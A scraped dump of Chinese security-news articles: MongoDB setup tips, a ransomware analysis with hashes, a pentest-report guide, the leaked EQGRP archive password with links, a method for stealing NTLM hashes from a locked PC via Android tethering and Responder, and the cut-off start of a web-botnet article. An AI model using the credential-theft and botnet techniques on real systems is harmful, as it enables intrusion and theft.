127.0.0.1:65521/xunfeng成功！3、pycharm中安装mongo可视化插件时会提示认证失败，一直找不到原因；直到通过以上步骤shell连接上数据库，查看用户信息后才发现：（你说坑不坑，错误提示里是没有的啊，为啥当时没有多试一个；））在这里选择相应的方式    成功这里记着要用使修改后的conf生效（但为啥：每次都要指定，或用配置文件启动 ），这样才会连接成功；总结：其实就是数据库的服务启动时的问题，1、没有启动服务2、在没有使用默认端口的情况下没有指定使用的端口，（配置文件里也没有写）后续启动mongod服务的，写在开机启动服务里，并在后台运行 就好；这样不用每次都手动启动进入 /etc/rc.local 在最后写 启动mongod的命令mongod --port 65521 --dbpath=/var/lib/mongodb &amp;（或更改mongod的配置文件，并# mongod --config /etc/mongodb.conf &amp;）；注：1、记得写 “空格 &amp;” 以后台形式运行；不然会在启动的时候卡住2、如果有exit 0，上述命令写在exit 0 的前面；（exit 0 表示退出当前脚本，后续命令不会执行）有不对之处，望大家能交流、指正；谢谢！","2017-07-03 17:31:44","安全工具","不使用默认端口时mongo的几个坑（使用巡风时）","http://nsoad.com/Security-tools/20170703/86f451c72ce7f6ca9f501f55b34f4d2a.html"
"5ccbf9c14f2f0a0a7a69bfbd","你或许不会知道，咱们其实可以用windows注册表来检测是否曾经有一个特殊的USB设备连接过你的电脑。","kong","你或许不会知道，咱们其实可以用windows注册表来检测是否曾经有一个特殊的USB设备连接过你的电脑。验证USB设备的插入的重要性大家可能不会相信，也许有一天咱们真会用上这个小技巧。比如你朋友的移动硬盘里被警察从你这里搜了出来，但是里面装满了儿童岛国动作片。这时候，证明这玩意儿不是你的就显得非常重要了。我们想要检查某一台USB设备是否插入过自己的电脑，可以采用操作windows注册表的方式。因为每当有设备连接到你电脑的USB接口时，系统会将设备序列号和相应的信息储存在注册表中。windows注册表验证USB设备的插入下面我们将演示下如何找到设备的信息：1. 同时按下WIN+R键，也就是打开“运行”。2. 输入regedit，按下回车。3. 转到HKEY_LOCAL_MACHINE\SYSTEM\ControlSet00x\Enum\USBSTOR（这里ControlSet00x里的下可以是任何数字）4. 下面就能列出连接过我们电脑的USB设备了，图里画红框框的就是：  咱们点击下注册表中任意一台设备就可以发现，它们都有由设备制造商指定的独立id。所以，如果我们想分辨是否有新的USB设备连接到该电脑上，肯定是非常容易的。下面的图里，我们可以看到电脑对某台USB设备收集的相关信息：如果下次如果你的U盘丢了，你又不好意思去质问你的朋友或同伴。也许在这时候，找机会翻翻他的注册表会是个不错的主意。","2016-12-09 11:04:16","数据安全","小技巧：如何发现是否有人用USB偷插你的电脑？","http://nsoad.com/Article/dbsec/20161209/902.html"
"5ccbf9c14f2f0a0a7a69bfbe","十几个小时前，Shadow Brokers 把从 NSA 那盗来的方程式组织相关文件剩下的 eqgrp-auction-file.tar.xz.gpg 文件密码公布了：","LanT34m","十几个小时前，Shadow Brokers 把从 NSA 那盗来的方程式组织相关文件剩下的 eqgrp-auction-file.tar.xz.gpg文件密码公布了：CrDj""(;Va.*NdlnzB9M?@K2)#&gt;deB7mN注：去年7月份，Shadow Brokers 公开了两大文件：eqgrp-free-file.tar.xz.gpgeqgrp-auction-file.tar.xz.gpg第一个 free 的，其中发现了不少针对主流防火墙及相关设备的 0day exploit，已经足够说明其价值之高。当时第二个文件是拿来悬赏的，需要 100 万枚比特币，几乎无人问津，拖拖拉拉到现在，全部公布了，并且发了篇文章给美帝总统川普大家感兴趣可以看看：https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1这个注的背景信息很大，更多的，大家自己回顾历史。我们实测，解成功。已经有人（x0rz）在 Twitter 进行“直播”分析了，可以看这：https://twitter.com/x0rz并且在 GitHub 上释放了他解开的相关文件：https://github.com/x0rz/EQGRP其中 Linux 是解开的最原始文件目录，archive_files 则是其中相关的压缩包解压。x0rz 的 Twitter 上可以看到如下初步分析：1、调侃 Shadow Brokers 是俄罗斯黑客2、重磅好货：Solaris Remote Root Exploit，支持如下（注：这个 Exploit 可能会影响华为相关设备，且有入侵中国相关运营商的记录信息）：3、TAO's TOAST framework 可以清除 Unix wtmp 日志，入侵无痕了（注：TAO 是 NSA 一支牛逼哄哄黑黑皆知的入侵团队）：4、记录显示 NSA 黑掉过巴基斯坦最大运营商 Mobilink 的 GSM 网络：5、方程式这个心机婊，有个工具 electricslide.pl 发出的 HTTP 请求嫁祸给中国：6、TAO 组织喜欢用 /tmp/.scsi 来做临时文件隐藏。7、脚本方面，方程式组织更喜欢 Perl，其次是 Shell，然后是 Python：8、方程式组织用到的一些密码：9、方程式组织其中的一个私钥：10、280 多个受威胁的 IP：https://gist.github.com/denniskupec/132adf5b5f4242b05ef76e6c40b1bf3e信息量很大。以上这些基本都是 0xrz 的分析，我们这仅作了整理汇总。建议：更多内容可以看解出来后 Linux/doc 下的各种文案。注：简单的 PK 关系：Shadow Brokers vs NSA(方程式 &amp; TAO)。注：NSA：美国国家安全局。不多说了，发车。题图：来自 The Hacker News-----------------微信公众号「Lazy-Thought」几个黑客在维护，都很懒，都想改变点什么","2017-04-11 11:26:13","数据安全","方程式 eqgrp-auction-file.tar.xz.gpg 文件已解","http://nsoad.com/Article/dbsec/20170411/1134.html"
"5ccbf9c24f2f0a0a7a69bfbf","巡风（关于巡风，点击此处了解）可以用来做这件事，当然某些地方需要根据自己实际情况修改、增加,这里不赘述；...","SECPULSE","Burp Suite是一款信息安全从业人员必备的集 成型的渗透测试工具，它采用自动测试和半自动测试的方式，包含了:Proxy,Spider,Scanner,Intruder,Repeater,Sequencer,Decoder,Comparer等工具模块。通 过拦截HTTP/HTTPS的web数据包，充当浏览器和相关应用程序的中间人，进行拦截、修改、重放数据包进行测试，是web安全人员的一把必备的瑞士军刀。官方试用最新版新支持windows(.exe)直接安装，下载地址：https://portswigger.net/burp/download.html功能    拦截代理（Proxy），你可以检查和更改浏览器与目标应用程序间的流量；    可感知应用程序的网络爬虫（Spider），它能完整的枚举应用程序的内容和功能；    高级扫描器，执行后它能自动地发现web应用程序的安全漏洞；    入侵测试工具（Intruder），用于执行强大的定制攻击去发现及利用不同寻常的漏洞；    重放工具（Repeater），一个靠手动操作来触发单独的HTTP 请求，并分析应用程序响应的工具；    会话工具（Sequencer），用来分析那些不可预知的应用程序会话令牌和重要数据项的随机性的工具；    解码器，进行手动执行或对应用程序数据者智能解码编码的工具；    扩展性强，可以让你加载Burp Suite的扩展，使用你自己的或第三方代码来扩展Burp Suit的功能。1.7.13更新内容此版本增加了各种增强功能和错误修复具体更新内容参见：http://releases.portswigger.net/2016/11/1713.html下载地址链接: http://pan.baidu.com/s/1jHGv86y 密码: p7tw  解压密码SecPulse.Com","2017-06-20 15:52:27","安全工具","渗透测试神器Burp Suite v1.7.13","http://nsoad.com/Security-tools/20170620/tools-1161.html"
"5ccbf9c24f2f0a0a7a69bfc0","网络攻击者总是深谙人性，因为他们知道，安逸的春节假日，无论是个人还是企业都会对网络安全放松警惕，而这样的氛围最适合攻击者“搞事情”。","途隆安全云","网络攻击者总是深谙人性，因为他们知道，安逸的春节假日，无论是个人还是企业都会对网络安全放松警惕，而这样的氛围最适合攻击者“搞事情”。比如，轰隆而来的区块链列车，裹挟着恶意软件。春节期间，欧洲一个废水处理设施运营技术网络的服务器遭遇了加密货币恶意软件的入侵，直接拖垮了废水处理设备中的HMI服务器CPU。据了解，此次入侵主要是为了挖掘门罗币，通过增加设备CPU与网络带宽的消耗，最大程度利用硬件资源进行货币采矿。恶意软件入侵危害不容小觑，打击网络攻击刻不容缓对于一些企业、政府部门等机构来说，节假日期间参与企业网络安全维护的员工数量较平日大幅减少，相关的服务器、网络设备大多处于自动运行状态，因此，网络安全防护力量变得更为薄弱，极易遭到黑客攻击。网络威胁在弹指间便摧城拔寨，稍有迟疑，就可能造成巨大损失。有鉴于此，途隆安全云为服务的千万客户提供了“春节不打烊”全年无休的网络安全防护。途隆抗DDoS服务、CC攻击防护、途隆DDoS态势感知系统、DNS域名安全解析……这些让企业进行安全计算的服务都在正常运行。和节日里安静的商业街相比，网络空间的正邪较量依然打的火热。从途隆安全实验室监测的攻防数据显示：2月15日-2月20日（除夕至初五），途隆安全云平台累计防护峰值2.21T，累计攻击次数达21.16万次，累计成功保护IP 1530个。其中攻击类型TCP_SYN攻击占比34%，TCP_ACK_RST攻击占比35%，TCP CC攻击占比25%，ICMP攻击占比3%，非常见协议攻击占比2%。除了短短6天惊现的2.21T级防护峰值以外，2018年，AI与AI的较量，会让网络犯罪和安全创新之间的“猫捉老鼠游戏”迅速升级；有了2017年WannaCry、Petya等典型范例打样，不管是传播途径还是加密手段，勒索病毒的威胁都会比以往有很大提升；区块链技术大火，正在促使挖矿类病毒呈现爆炸性增长……不难预见，新的一年对于网络安防必将迎来一场硬仗。","2018-02-26 11:46:53","网络安全","没什么能凌驾于网络攻击之上，即便是春节","http://nsoad.com/Article/Network-security/20180226/9a9a8a2968d190f054cd254ffabc28ae.html"
"5ccbf9cb4f2f0a0a7a69bfc1","一款名为 FireCrypt 的勒索软件正悄然来袭。","secist","一款名为 FireCrypt 的勒索软件正悄然来袭。它不仅具备一般勒索软件的特性，会将受感染的系统文件恶意加密。还会试图利用受感染者机器，向其源码中硬编码的 URL 地址，发起微弱的 DDoS 攻击。这个新型勒索软件，是由 MalwareHunterTeam （恶意软件猎人小组）发现的。 以下是 MalwareHunterTeam 和 Lawrence Abrams 提供的对该恶意软件的分析报告。作为勒索软件构建套件的 FireCrypt恶意软件通常通过从源码编译生成，或者通过软件来自动生成，自动化软件会采用某些输入参数，并以此来定制恶意软件的有效载荷。后者在业内，被称为恶意软件构建器，一般都为 命令行 应用程序或 GUI 的工具。而 FireCrypt 勒索软件的作者，则使用的是命令行应用程序。在使用过程中，该应用程序会自动将 FireCrypt 的样本文件放在一起，允许他修改基本设置，而不需要再使用笨重的 IDE，重复编译源码了。FireCrypt 的构建器，被命名为 BleedGreen（见下文），它允许 FireCrypt 作者，给勒索软件自定义名称，并使用个性化图标，来生成一个独特的勒索软件可执行文件。与其他勒索软件构建器相比，BleedGreen 算是一个比较低端的构建器。与其他类似的构建器相比，它的自定义选项少的可怜。例如某些类似的构建器，还会有比特币收付款地址，赎金值，电子邮件联系地址等设置选项。BleedGreen 除了可以将生成的可执行文件 EXE ，伪装为 PDF 或 DOC 的图标外，它还会对勒索软件的二进制文件做细微的改动，以便在每次编译时，都能生成一个具有不同哈希值的文件。该技术经常被恶意软件开发人员，用来创建所谓的“多态性恶意软件”，这样做的目的就是尽可能的躲避杀毒软件的查杀。根据MalwareHunterTeam 的介绍，“BleedGreen 构建器是一款非常低端和基础的勒索软件构建器，因此它并不能真正意义上实现免杀。”不过从这也可以看出，FireCrypt 的作者还是具备一定的恶意软件开发经验的，而不是一个只会从 GitHub 下载开源勒索软件的脚本小子。FireCrypt 感染过程能否将 FireCrypt 感染给目标系统，取决于勒索软件的分发者能否成功诱使目标用户启动生成的 EXE 可执行文件。一旦生成的恶意 EXE 文件被成功触发，那么 FireCrypt 将会杀死计算机的任务管理器（taskmgr.exe）进程，并使用 AES-256 加密算法，对列表中的 20 个文件类型进行加密。所有被加密文件的原始文件名和扩展名都将附加“.firecrypt”后缀。例如，名为 photo.png 的文件，将被重命名为 photo.png.firecrypt。一旦文件加密过程结束，FireCrypt 就会在桌面，弹框警告用户按其要求支付相应的赎金，以此来换取文件的解锁。据 MalwareHunterTeam 介绍说，该赎金弹框与去年 10月14日 小组发现的一款勒索软件的赎金弹框几乎是一样的。当时发现该勒索软件时，好像还处于开发阶段并未成型。直到今年才发现，有受感染机器的文件被加密。唯一不同的是，去年发现的那款勒索软件在赎金弹框顶部放置了一个类似 logo 的标志，而  FireCrypt 却移除了这个标志。但是，通过仔细检查 Deadly 的源代码，MalwareHunterTeam 发现这两款勒索软件，使用的电子邮件和比特币地址相同，这表明两者之间紧密相关，FireCrypt 极有可能是 Deadly 这款勒索软件的升级版。DDoS 之用垃圾文件填充你的硬盘驱动器除了加密受感染用户文件并向用户索要赎金外， FireCrypt 还会调用其源码包含的一个函数，该函数会持续不断地连接到远程的一个 URL 地址，下载一些垃圾文件，并自动将其保存在你硬盘的 %Temp% 文件下，同时命名为 [random_chars]-[connect_number].html。如果用户不知道这个功能，FireCrypt 将会在短时间内，将垃圾文件迅速填充满你的 ％Temp％ 文件夹。当前该版本的 FireCrypt 勒索软件，将会从远程连接并下载 http://www.pta.gov.pk/index.php 上的内容，该 URL 为巴基斯坦电信管理局的官网地址。当前，我们无法使用勒索软件的构建器修改此 URL。FireCrypt 的作者将此功能称为 “DDoSer”，他必须感染成千上万台的机器，才有可能对巴基斯坦电信管理局的官网发起 DDoS 攻击。此外，所有受感染的计算机，都必须处于连网状态，只有这样才能参与到其发起的 DDoS 的攻击。截至这篇文章发布，还没有发现有效方法来恢复这些被加密的文件。因此，一旦你感染了这种勒索软件，想要在短时间内恢复文件，则可能不得不按要求支付 500 美元 的赎金来解锁。相反，如果你实在不愿意或无力支付这笔赎金。那么，请务必保留好这些被加密文件的副本，或许不久以后就会有人放出它的解密器。定位文件扩展名：.txt, .jpg, .png, .doc, .docx, .csv, .sql, .mdb, .sln, .php, .asp, .aspx, .html, .htm, .csx, .psd, .aep, .mp3, .pdf, .torrent与 FireCrypt 勒索软件相关联的文件：%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\[random_chars].exe - Startup Executable%Desktop%\[random_chars]-READ_ME.html - Ransom Note%AppData%\SysWin32\files.txt - List of Encrypted Files%Desktop%\random_chars]-filesencrypted.html - List of Encrypted Files%Temp%\random_chars]-[connect_number].html - Files downloaded during the DDoS attack与 FireCrypt 勒索软件相关的哈希值：leedGreen 构建器（当前 VirusTotal 扫描结果显示，在 57 款杀毒软件检测中，只有 2 款杀毒软件，认为它是恶意软件）：SHA-256: e77df2ce34949eb11290445a411a47fb927e8871e2580897581981d17730032d一个 FireCrypt 勒索软件二进制示例（当前 VirusTotal 扫描结果显示，在 57 款杀毒软件检测中，只有 13 款杀毒软件，认为它是恶意软件）：SHA-256: d49240e38603c29b38db86b6c11795f166e63d8385e8626232131f750cdb434f电子邮件地址和付款联系人：EMAIL: [email protected]/*  */Source:https://www.bleepingcomputer.com/","2017-01-06 12:10:26","系统安全","流氓会武功：这款勒索软件不仅能勒索，还能DDoS","http://nsoad.com/Article/system/20170106/990.html"
"5ccbf9cb4f2f0a0a7a69bfc2","在本章中，我们将学习渗透测试的最终和最重要的方面，撰写报告。","Aditya Gupta","在本章中，我们将学习渗透测试的最终和最重要的方面，撰写报告。 这是一个简短的章节，指导你在报告中写下你的方法和发现。 作为渗透测试者，如果能够更好地解释和记录你的发现，渗透测试报告会更好。 对于大多数渗透测试者来说，这是渗透测试中最没意思的部分，但它也是最重要的渗透测试步骤之一，因为它作为“至关重要的材料”，使其他技术和管理人员容易理解 。渗 透 测 试 报 告 基 础渗透测试报告是渗透测试过程中所有发现的摘要文档，包括但不限于所使用的方法，工作范围，假设，漏洞的严重程度等。 渗透测试报告仅用作渗透测试的完整文档，可用于消除已发现的漏洞并进一步参考。编 写 渗 透 测 试 报 告为了理解如何编写渗透测试报告，最好对渗透测试报告中的一些重要部分有一个清晰的了解。一些最重要的组成部分包括：执行摘要漏洞摘要工作范围使用的工具遵循的测试方法建议结论附录除此之外，还应该有关于渗透测试，进行渗透测试的组织和客户，以及“非披露协议”的足够详细信息。 让我们一个一个地去看上面的每个部分，来快速查看它。执 行 摘 要执行摘要是渗透测试的整个结果的快速演练。 执行摘要不需要太多技术，它只是一个总结，用于在尽可能短的时间内浏览渗透测试。 执行摘要是管理层和高管首先看到的。它的一个例子如下：XYZ 应用程序的渗透测试具有大量的开放输入验证缺陷，这可能导致攻击者访问敏感数据。你还应该解释此漏洞对于该组织业务的严重程度。漏 洞如标题所示，这应包括应用程序中发现的所有漏洞的摘要以及相关详细信息。 如果你在应用程序中找到的漏洞分配了 CVE 号码，你可以包括它。 你还应包括导致该漏洞的应用程序的技术详细信息。 另一种展示漏洞的好方法是对漏洞按照类别进行分类：低，中和高，然后在饼图或任何其他图形表示上展示它们。工 作 范 围工作范围仅仅意味着渗透测试涵盖并评估了哪些应用程序和服务。 它可以简单地写成一行，如下：该工作的范围仅限于 XYZ Android 和 iOS 应用程序，不包括任何服务端组件。使 用 的 工 具这是一个可选类别，通常可以包含在另一个类别中，也就是讨论漏洞发现和技术细节的地方。 在本节中，我们可以简单提到使用的不同工具及其特定版本。遵 循 的 测 试 方 法这个类别是最重要的类别之一，应该以详细方式编写。 这里，渗透测试者需要指定不同的技术，和他在渗透测试阶段所遵循的步骤。 它可以是简单的应用程序逆向，流量分析，使用不同的工具的库和二进制文件分析，等等。此类别应指定其他人需要遵循的完整过程，以便完全理解和重现这些漏洞。建 议此类别应指定要执行的不同任务，以便组织保护程序并修复漏洞。 这可能包括一些东西，类似建议以适当权限保存文件，加密发送网络流量以及正确使用 SSL 等。 它还应包括在考虑到组织的情况下，执行这些任务的正确方法。结 论这个部分应该简单地总结渗透测试的总体结果，并且我们可以使用漏洞类型的概述，简单地说明应用程序是不安全的。 记住，我们不应该涉及所发现的不同漏洞的详细信息，因为我们已经在前面的章节中讨论过了。附 录渗透测试报告的最后一部分应该是附录，或者一个快速参考，读者可以使用它快速浏览渗透测试的特定主题。总 结在本章中，我们对渗透测试报告的不同部分进行了快速演练，渗透测试者需要了解这些部分才能编写报告。 本章的目的是在渗透测试的最后阶段，作为一个编写渗透测试报告的简洁指南。 此外，你可以在下一页找到渗透测试报告的示例。对于渗透测试人员，和想入门 Android 安全的人来说，我希望这本书会成为一个伟大的工具。 本书中提到的工具和技术将帮助你入门 Android 安全。 祝你好运！下面是渗透测试报告的示例：Attify 漏洞应用安全审计报告应用程序版本：1.0日期：2014年1月作者：Aditya Gupta摘要：2014年1月，Attify 实验室对 Android 平台的移动应用程序“Attify 漏洞应用”进行了安全评估。 本报告包含审计过程中的所有发现。 它还包含首先发现这些漏洞的过程，以及修复这些问题的方法。目录1. 引 言1.1 执行摘要Attify Labs 受委托对 XYZ 公司的 Android 应用程序“Attify 漏洞应用”执行渗透测试。 此渗透测试和审计的目的是确定 Android 应用程序以及与其通信的 Web 服务的安全漏洞。我们在测试期间十分小心，以确保在执行审计时不会对后端 Web 服务器造成损害。 该评估在 Aditya Gupta 的领导下进行，团队由三名内部渗透测试人员组成。在审计期间，在 XYZ Android 应用程序和后端 Web 服务中发现了一些安全漏洞。 总的来说，我们发现系统是不安全的，并且具有来自攻击者的高威胁风险。此次审计的结果将有助于 XYZ 公司使他们的 Android 应用程序和 Web 服务免受攻击者造成的安全威胁，这可能会损害声誉和收入。1.2 工作范围这里执行的渗透测试集中于 XYZ 公司的 Android 应用程序，名为“Attify 漏洞应用”。 渗透测试还包括 所有 Web 后端服务，Android 应用程序与之进行通信。1.3 漏洞摘要Android应用程序“Attify 漏洞应用”被发现存在漏洞，包括应用程序本身，以及由于在应用程序中使用第三方库的很多漏洞。我们已成功利用该库，使我们可以访问存储在设备上的整个应用程序的数据。此外，在应用程序中找到的webview组件使应用程序容易受到 JavaScript 响应的操纵，使我们可以访问应用程序中的整个 JavaScript 界面。这最终允许我们利用不安全网络上的应用程序，导致应用程序行为控制，还允许我们在用户没有知晓的情况下安装更多应用程序，进行意外的拨号和发送短信等。在应用程序中发现的其他漏洞包括不安全的文件存储，一旦设备已经 root，这使我们可以访问存储在应用程序中的敏感用户凭据。此外，我们可以注意到，应用通信的 web 服务没有用于用户认证的适当安全措施，并且可以使用 SQL 认证绕过攻击来访问存储在 web 服务器上的敏感信息。2. 审 计 与 方 法 论2.1 使用的工具以下是用于整个应用程序审计和渗透测试流程的一些工具：测试平台：Ubuntu Linux Desktop v12.04设备：运行 Android v4.4.2 的 Nexus 4Android SDKAPKTool 1.5.2：将 Android 应用程序反编译成 Smali 源文件Dex2Jar 0.0.9.15.48：将 Android 应用程序源反编译为 JavaJD-GUI 0.3.3：读取 Java 源文件Burp Proxy 1.5：代理工具Drozer 2.3.3：Android 应用程序评估框架NMAP 6.40：扫描 Web 服务2.2 漏洞问题#1：Android 应用程序中的注入漏洞说明：在 Android 应用程序的 DatabaseConnector.Java 文件中发现了一个注入漏洞。参数 account_id 和 account_name 被传递到应用程序中的 SQLite 查询中，使其易于遭受 SQLite 注入。风险级别：严重修复：在传递到数据库命令之前，应正确校验用户输入。问题#2：WebView 组件中的漏洞说明：WebDisplay.java 文件中指定的 Android 应用程序中的 WebView 组件允许执行 JavaScript。攻击者可以拦截不安全网络上的流量，创建自定义响应，并控制应用程序。风险等级：高补救：如果应用程序中不需要 JavaScript，请将 setJavascriptEnabled 设置为 False。问题#3：无/弱加密说明：Android应用程序将认证凭据存储在名为 prefs.db 的文件中，该文件存储在设备上的应用程序文件夹中，即 /data/data/com.vuln.attify/databases/prefs.db。通过 root 权限，我们能够成功地查看存储在文件中的用户凭据。身份验证凭据以 Base64 编码存储在文件中。风险等级：高补救：如果认证证书必须存储在本地，则应使用适当的安全加密存储。问题#4：易受攻击的内容供应器说明：发现 Android 应用程序的内容供应器已导出，这使得它也可以由设备上存在的任何其他应用程序使用。内容供应器是 content://com.vuln.attify/mycontentprovider。风险等级：高补救：使用 exported = false，或在 AndroidManifest.xml 中指定内容供应器的权限。3. 结 论3.1 结论我们发现该应用程序整体上存在漏洞，拥有内容供应器，SQLite 数据库和数据存储技术相关的漏洞。3.2 建议我们发现该应用程序容易受到一些严重和高危漏洞的攻击。 付诸一些精力和安全的编码实践，所有的漏洞都可以成功修复。为了维持应用程序的安全，需要定期进行安全审计，来在每次主要升级之前评估应用程序的安全性。","2017-03-03 22:47:46","移动安全","Android 渗透测试学习手册（九）编写渗透测试报告","http://nsoad.com/Article/MobileSecurity/20170303/1095.html"
"5ccbf9cb4f2f0a0a7a69bfc3","Room362之前发布从锁定计算机中盗取凭证信息一文，其中的方法很棒。这种攻击方式之所以能成功，主要原因在于系统访问设备的时候，会自动加载设备驱动，即便计算机处在锁定状态也是如此，当然也包括USB网络","kong","简介Room362之前发布从锁定计算机中盗取凭证信息一文，其中的方法很棒。这种攻击方式之所以能成功，主要原因在于系统访问设备的时候，会自动加载设备驱动，即便计算机处在锁定状态也是如此，当然也包括USB网络适配器的驱动程序。了解到这一点之后，我们就可以尝试用Android网络共享功能——也就是所谓的Tethering来创建网络。启用网络共享功能之后，手机设备就能够接收来自主机的所有通信数据，手机是作为网关存在。这样一来要执行中间人攻击简直轻而易举。本文中，我将为大家讲解其中涉及的步骤，工具，以及进行一次成功攻击所需要的配置。Android网络共享功能Android设备进入USB Tethering网络共享模式的时候，系统会在USB接口新增一个USB接口描述符并重启。主机操作系统会查询Android设备，也就是通过USB端口连接手机的时候， 它会接收USB网络设备描述符，之后加载驱动程序。驱动一旦加载，主机操作系统会创建一个新的网络接口（通过USB）。主机处理该网络接口与处理其他接口的方式没有差别。此时USB连接处在活跃状态，主机就会发送DHCP请求来获取IP。在原生的Android网络共享配置中，系统会用dnsmasp建立一个DHCP和DNS服务器来响应该请求。它为主机提供连接到网络所需的IP地址以及路由信息。在Android Tethering网络共享的具体实施中，这些配置细节是硬编码到Tethering.java程序包中的。显然，在已获得root权限的Android设备中，我们自己动手配置这些信息不是难事。除此之外，iptables转发规则可以设置为从USB到外部接口（通常为Wi-Fi或3G）间转发流量。完成这项操作后，主机就可以使用USB网络连接到互联网了（即网络共享功能）。中间人攻击攻击者在网络中投放恶意数据包，迫使网络设备连接攻击者的网络，那么发动中间人攻击也就不需要Tethering了。就像前文所说的那样，通过Tethering网络共享连接的话，主机所有的流量都会流经设备。即便设备连接到其他网络，部分网络流量还是会流经USB网络，这对于某些身份凭证信息的泄露已经足够了。盗取凭证这一例中，中间人攻击工具我们选择了Responder。这是个被动凭证收集工具，Responder监听指定的NetBIOS Name Service(NBT-NS)以及本地链路多播名称解析 (LLMNR)查询。该工具包含了通过TCP和UDP端口监听的欺骗身份验证服务器。受害者被重定向至这些服务器，这样就能获取到这些人的身份验证凭证了。使用Responder劫持流量并捕获凭证非常高效。特别是当用户在网上的动作比较活跃的时候（例如，浏览网页，访问内部共享等）。从锁定机器中盗取凭证该攻击向量首先假定用户不在或者在网络中不活跃。还有些先决条件，用户之前必须已经登录过主机，或者说已经在主机上进行过身份认证，另外当然也需要我们能够实际接触到这台主机及其USB端口。网络代理自发现协议 (WPAD)协议可用来自动定位proxy auto-config (PAC)文件。PAC的位置可以通过DHCP响应“site-local”选项252(即auto-proxy-config)与“    http://example.com/wpad.dat”值提供给用户。DHCP比DNS拥有更高的优先权。如果DHCP提供WPAD URL，则DNS不会执行查询，这只适用于DHCPv4。在DHCPv6中没有定义WPAD选项。所有的Web浏览器都支持该协议，包括Windows，MacOSX，Linux以及iOS和Android系统的。不过默认只有在Windows操作系统中启用。方法结合谈到网络共享功能和DHCP，我们前面已经提过，用Android设备可以创建网络和DHCP服务器。使用Android的dnsmasq也可以很方便的创建DHCP服务器，并且配置WPAD选项指向Responder。至于身份验证，在锁定的计算机上之所以可以这样攻击是因为代理自动配置文件包含了DHCP响应所需的细节信息。当主机尝试检索PAC文件，Responder的HTTP服务会返回一个“(407)身份验证请求”信息。在大多数情况下，主机通过用户缓存的凭证进行身份验证。Windows使用NTLM协议来完成认证，这是个challenge-response身份验证协议。用户密码hash以及challenge-response步骤在此作为用户身份验证的token。虽然没有明文凭证可供攻击者直接使用，但破解出hash并获得用户密码还是有可能的。如果密码强度比较弱，那么破解所需的时间不会太长。不过对于刚启动的机器来说由于还没有缓存凭证，所以这种攻击方式是无效的。然而一旦用户先前就进行过身份验证，主机就可以尝试再次获取文件。不过还面临一个挑战，就是如何在Android设备上跑Responder（这是个Python项目）。这里提供多种解决方案供考虑，最简单粗暴的方法就是安装qPython应用。qPython是一款针对Android的Python编译器，它能够完美的运行Responder。还有个替代方案是安装NetHunter，NetHunter是从Kali    Linux移植到Android之上的，同样的它也包含Python编译器。一台已root的Android设备，一颗好奇的心？安装qPython，下载脚本和Responder，然后按指示进行。    这段视频展示的是Windows 10锁屏界面。测试主机最新安装了Windows操作系统，且没有加入任何域，未连接到其他任何网络，用户之前通过了身份验证后锁定了屏幕。连接一台Android设备，运行上面提到的Responder脚本。注意在执行Responder后的几秒钟，在没有进行任何交互的情况下，用户的NTLM hash已经捕获到。下图展示了捕获到的数据：脚本执行步骤，通过设置网络并运行Responder启用网络共享功能。黄色部分为捕获到的hash解决方案在操作系统和浏览器中禁用自动代理配置设置，至少可以防止上述锁屏攻击。不过在公司网络中需要用到代理或者依赖于自动配置，当然就会有些麻烦了。不过我们要使用代理，最好是硬编码设置或者由自动配置脚本提供。以下为不同操作系统规避这种攻击的设置方法：Windows 10, 8.1, and 8打开设置 (开始 → 在Windows 10中为设置 / 左下角 → Windows 8, 8.1为更改计算机设置).选择 网络 之后选择左边的代理.确保“自动检测设置”已禁用.Windows 7, Vista, XP单击开始进入控制面板.在控制面板中选择互联网选项.在连接选项卡中选择LAN设置.确保“自动检测设置”已禁用.MacOSX打开系统偏好.选择网络之后选择活跃连接选择高级之后进入代理选项卡.确保“自动发现代理”已禁用.","2016-12-07 13:48:11","系统安全","用手机从锁定的计算机中偷取凭证信息","http://nsoad.com/Article/system/20161207/893.html"
"5ccbf9cb4f2f0a0a7a69bfc4","僵尸网络（Botnet）已出现多年，对网络安全构成了巨大的挑战。随着攻防技术的发展，除了基于PC和服务器的传统僵尸网络，近年来，还出现了多种形态的僵尸网络，如基于智能手机、IOT设备或者Webshell等等的新","kong","僵尸网络（Botnet）已出现多年，对网络安全构成了巨大的挑战。随着攻防技术的发展，除了基于PC和服务器的传统僵尸网络，近年来，还出现了多种形态的僵尸网络，如基于智能手机、IOT设备或者Webshell等等的新型僵尸网络。Web前端僵尸网络的基本原理本文将介绍一种基于Web前端的僵尸网络。在新的HTML5标准越来越广泛地被使用之后，HTML5的强大功能为构建僵尸网络提供了可能性。由于这种僵尸网络基于支持HTML5的Web前端浏览器，所以其权限很低。不过，基于Web前端的僵尸网络至少可以用作DDOS攻击，如果处理得当，也可以用作对HTTP服务器进行扫描等操作。下面是本文总结的Web前端僵尸网络的技术基础：1、HTML5 新增技术——Web Worker技术。这是一种多线程机制，使得浏览器可以在不影响用户操作的同时处理其他事务，这为恶意的JS脚本提供了异步环境；2、HTML5 新增机制——跨域资源共享机制(CORS)。CORS处理机制工作在浏览器层面，如果服务器不允许跨站，浏览器将拦截服务器返回的结果。也就是说即使是跨域请求，服务器也同样会处理，并正常返回请求的资源。这个技术本身其实不对僵尸网络构成支持，但是HTML5支持CORS机制之后并未禁止跨域发送请求，这就成了前端僵尸网络立足的关键；3、Web蠕虫。类似于传统的蠕虫病毒，Web蠕虫使前端僵尸网络可以自行传播，结合Web蠕虫，前端僵尸网络可以相对容易地形成规模。以上三个技术点，合成在一起，为僵尸网络的存在提供了基本条件。下面进行详细介绍。Web WorkerWeb Worker 是运行在后台的 Javascript，独立于其他脚本，不会影响页面的性能。下面简单列举一下Web Worker能够做什么。1.可以加载一个JS进行大量的复杂计算而不挂起主进程，用户可以在Worker运行期间做点击、选取内容等等任何事情；2.可以通过postMessage，onmessage方法进行线程通信；3.可以在Worker中通过importScripts(url)加载另外的脚本文件；4.可以使用 setTimeout，clearTimeout，setInterval，clearInterval等方法；5.可以使用XMLHttpRequest来发送请求，以及访问navigator的部分属性。Web Worker增强了浏览器的能力。功能强大了，危险性也随之增大了。CORS跨域资源共享机制跨域HTTP请求(Cross-site HTTP 